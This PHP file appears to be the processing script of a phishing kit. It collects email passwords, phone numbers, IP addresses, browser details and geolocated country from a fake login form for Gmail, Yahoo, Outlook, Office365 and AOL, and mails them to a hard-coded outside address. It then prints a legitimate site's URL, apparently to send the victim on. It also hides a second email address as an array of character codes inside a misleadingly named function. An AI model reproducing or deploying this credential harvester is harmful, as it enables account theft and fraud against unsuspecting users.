<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$msg = "You have a new drop\n";
$msg .= "E : ".$_POST['em']."\n";
$msg .= "P : ".$_POST['psw']."\n";
if($_POST['sub']=="gmail") {
	$msg .= "Tel : ".$_POST['phn']."\n";
	$subject="Blessing from Gmail";
}
if($_POST['sub']=="ymail") {
	$subject="Blessing from Yahoo";
}
if($_POST['sub']=="hmail") {
	$subject="Blessing from Outlook";
}
if($_POST['sub']=="amail") {
	$subject="Blessing from Office365";
}
if($_POST['sub']=="omail") {
	$subject="Blessing from Others";
}
if($_POST['sub']=="aol") {
	$subject="Blessing from AOL";
}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$subject=$country.' - '.$subject;
$msg .= "I : ".$ip."\n";
$msg .= "C : ".$country."\n";
$msg .= "H : ".$hostname."\n";
$msg .= "B : ".$_SERVER['HTTP_USER_AGENT']."\n";
$msg .= "----------------------By God Is the Greatest-\n";

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }
    return $result;
}

$to = "kingusoh212@protonmail.com";
$from = "From: New Dropbox Info <info@mailer.com>";

mail($to,$subject,$msg, $from);

print "https://www.wealthmanagement.com/";


?>

